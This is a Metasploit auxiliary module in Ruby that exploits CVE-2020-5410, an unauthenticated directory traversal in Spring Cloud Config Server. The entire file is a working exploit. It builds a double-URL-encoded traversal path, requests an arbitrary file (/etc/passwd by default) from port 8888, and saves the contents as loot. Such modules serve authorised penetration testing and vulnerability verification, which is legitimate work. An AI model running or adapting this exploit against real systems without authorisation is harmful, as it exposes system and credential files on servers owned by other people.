##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Directory Traversal in Spring Cloud Config Server',
        'Description' => %q{
          This module exploits an unauthenticated directory traversal vulnerability
          which exists in Spring Cloud Config versions 2.2.x prior to 2.2.3 and
          2.1.x prior to 2.1.9, and older unsupported versions. Spring
          Cloud Config listens by default on port 8888.
        },
        'References' => [
          ['CVE', '2020-5410'],
          ['URL', 'https://tanzu.vmware.com/security/cve-2020-5410'],
          ['URL', 'https://xz.aliyun.com/t/7877']
        ],
        'Author' => [
          'Fei Lu', # Vulnerability discovery
          'bfpiaoran@qq.com', # Vulnerability discovery
          'Dhiraj Mishra' # Metasploit module
        ],
        'DisclosureDate' => '2020-06-01',
        'License' => MSF_LICENSE
      )
    )

    register_options(
      [
        Opt::RPORT(8888),
        OptString.new('TARGETURI', [true, 'The base path to Spring Cloud Config installation', '/']),
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 11 ])
      ]
    )
  end

  def run_host(ip)
    traversal = '../' * datastore['DEPTH']
    traversal = "#{traversal}#{datastore['FILEPATH']}"
    traversal = traversal.gsub('/', '%252F')
    traversal << '%23foo/development'
    trav_uri = normalize_uri(target_uri.path, traversal)

    res = send_request_raw({
      'method' => 'GET',
      'uri' => trav_uri
    })

    unless res && res.code == 200
      print_error('Nothing was downloaded')
      return
    end

    print_good("#{peer} - Downloaded #{res.body.length} bytes")
    path = store_loot(
      'springcloud.traversal',
      'text/plain',
      ip,
      res.body
    )
    print_good("File saved in: #{path}")
  end
end
